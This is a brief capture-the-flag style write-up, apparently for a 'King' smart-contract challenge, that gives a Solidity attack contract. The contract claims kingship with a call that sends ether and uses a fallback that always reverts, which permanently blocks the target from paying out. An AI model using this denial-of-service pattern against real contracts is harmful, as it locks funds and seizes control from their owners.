1) I created a contract which had a bug in the fallback function
pragma solidity ^0.6.0;

contract hackKIng{
    constructor(address king)public payable{
     (bool result,  bytes memory data) = king.call{value:msg.value}("");   
    }
    fallback()external payable{
        revert("I'm still King");
    }
}
 which made sure I was the owner after i submitted the instance.
